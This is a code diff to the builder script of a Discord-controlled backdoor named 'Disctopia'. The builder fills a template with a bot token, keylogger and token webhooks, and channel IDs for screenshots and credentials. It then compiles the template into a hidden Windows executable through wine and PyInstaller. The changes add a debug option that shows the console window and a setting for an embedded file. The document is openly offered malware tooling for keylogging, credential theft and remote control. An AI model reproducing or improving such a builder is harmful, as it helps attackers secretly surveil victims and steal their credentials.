@@ -8,7 +8,7 @@ from prettytable import PrettyTable
 
 class Builder:
     
-    def __init__(self,BACKDOOR_NAME,BOT_TOKEN,TOKEN_WEBHOOK,KEYLOGGER_WEBHOOK,SCREENSHOTS_ID,DOWNLOADS_ID,AGENT_ONLINE_ID,CREDENTIALS_ID,KEYLOG ):
+    def __init__(self,BACKDOOR_NAME,BOT_TOKEN,TOKEN_WEBHOOK,KEYLOGGER_WEBHOOK,SCREENSHOTS_ID,DOWNLOADS_ID,AGENT_ONLINE_ID,CREDENTIALS_ID,KEYLOG,DEBUG):
         self.BACKDOOR_NAME = BACKDOOR_NAME
         self.KEYLOG = KEYLOG
         self.KEYLOGGER_WEBHOOK = KEYLOGGER_WEBHOOK
@@ -18,6 +18,7 @@ class Builder:
         self.DOWNLOADS_ID = DOWNLOADS_ID
         self.AGENT_ONLINE_ID = AGENT_ONLINE_ID
         self.CREDENTIALS_ID = CREDENTIALS_ID
+        self.DEBUG = DEBUG
         self.path_to_pyinstaller = os.path.expanduser('~/.wine/drive_c/users/root/Local Settings/Application Data/Programs/Python/Python38-32/Scripts/pyinstaller.exe')
 
 
@@ -27,7 +28,7 @@ class Builder:
         file = f.read()
         f.close()
 
-        newfile = file.replace("{KEYLOG}", str(self.KEYLOG.capitalize()))
+        newfile = file.replace("{KEYLOG}", str(self.KEYLOG).capitalize())
         newfile = newfile.replace("{BOT_TOKEN}", str(self.BOT_TOKEN))
         newfile = newfile.replace("{TOKEN_WEBHOOK}", str(self.TOKEN_WEBHOOK))
         newfile = newfile.replace("{KEYLOGGER_WEBHOOK}", str(self.KEYLOGGER_WEBHOOK))
@@ -44,6 +45,8 @@ class Builder:
 
     def compile(self):
         compile_command = ["wine", self.path_to_pyinstaller, "--onefile", "--noconsole", "--icon=img/exe_file.ico", self.BACKDOOR_NAME+".py"]
+        if self.DEBUG == True:
+            compile_command.pop(3)
         if os.name == 'nt':
             compile_command[1] = 'venv/Scripts/pyinstaller.exe'
             compile_command.remove("wine")
@@ -67,7 +70,7 @@ print('''
 
 Made by Dimitris Kalopisis | Twitter: @DKalopisis\n\n\n''')
 
-list =["None","None","None","None","None","None","None","None","None"]
+list =["None","None","None","None","None","None","None","None","None","None"]
 
 def getArgs():
     parser = argparse.ArgumentParser(description='Disctopia Backdoor Builder')
@@ -87,6 +90,7 @@ def createTable(list):
     table.add_row(["Agent-Online-ID", list[6]])
     table.add_row(["Credentials-ID", list[7]])
     table.add_row(["Auto-Keylogger", list[8]])
+    table.add_row(["Embeded File", list[9]])
 
     return table
 
@@ -102,6 +106,7 @@ def fetch(list):
         list[6] = data["settings"]["agent-online-id"]
         list[7] = data["settings"]["credentials-id"]
         list[8] = data["settings"]["auto-keylogger"]
+        list[9] = data["settings"]["embeded-file"]
 
     return list
 
@@ -175,7 +180,11 @@ else:
                     if answer == "y":
                         print("\n[+] Building the Backdoor")
                         print("[+] Please wait...\n")
-                        builder = Builder(BACKDOOR_NAME=list[0],BOT_TOKEN=list[1],TOKEN_WEBHOOK=list[2],KEYLOGGER_WEBHOOK=list[3],SCREENSHOTS_ID=list[4],DOWNLOADS_ID=list[5],AGENT_ONLINE_ID=list[6],CREDENTIALS_ID=list[7],KEYLOG=list[8])
+                        if "-d" in command_list:
+                            debug = True 
+                        else:
+                            debug = False
+                        builder = Builder(BACKDOOR_NAME=list[0],BOT_TOKEN=list[1],TOKEN_WEBHOOK=list[2],KEYLOGGER_WEBHOOK=list[3],SCREENSHOTS_ID=list[4],DOWNLOADS_ID=list[5],AGENT_ONLINE_ID=list[6],CREDENTIALS_ID=list[7],KEYLOG=list[8],DEBUG=debug)
                         builder.build()
                         cont = False
                         print('\n[+] The Backdoor can be found inside the "dist" directory')
